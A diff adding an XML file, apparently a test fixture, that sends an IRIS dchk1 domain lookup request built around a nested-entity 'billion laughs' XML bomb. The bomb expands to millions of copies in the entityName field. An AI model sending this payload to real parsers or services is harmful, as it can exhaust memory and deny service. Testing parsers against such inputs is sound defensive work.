@@ -1,0 +1,25 @@
+<!DOCTYPE request [
+  <!ENTITY x0 'This should get a realy huge xml-bomb'>
+  <!ENTITY x1 '&x0;&x0;&x0;&x0;'>
+  <!ENTITY x2 '&x1;&x1;&x1;&x1;'>
+  <!ENTITY x3 '&x2;&x2;&x2;&x2;'>
+  <!ENTITY x4 '&x3;&x3;&x3;&x3;'>
+  <!ENTITY x5 '&x4;&x4;&x4;&x4;'>
+  <!ENTITY x6 '&x5;&x5;&x5;&x5;'>
+  <!ENTITY x7 '&x6;&x6;&x6;&x6;'>
+  <!ENTITY x8 '&x7;&x7;&x7;&x7;'>
+  <!ENTITY x9 '&x8;&x8;&x8;&x8;'>
+  <!ENTITY x10 '&x9;&x9;&x9;&x9;'>
+  <!ENTITY x11 '&x10;&x10;&x10;&x10;'>
+  <!ENTITY x12 '&x11;&x11;&x11;&x11;'>
+  <!ENTITY x13 '&x12;&x12;&x12;&x12;'>
+  <!ENTITY x14 '&x13;&x13;&x13;&x13;'>
+  <!ENTITY x15 '&x14;&x14;&x14;&x14;'>
+]>
+<iris1:request xmlns:iris1="urn:ietf:params:xml:ns:iris1">
+  <iris1:searchSet>
+    <iris1:lookupEntity registryType="dchk1" entityClass="domain-name"
+     entityName="&x15;"/>
+  </iris1:searchSet>
+</iris1:request>
+
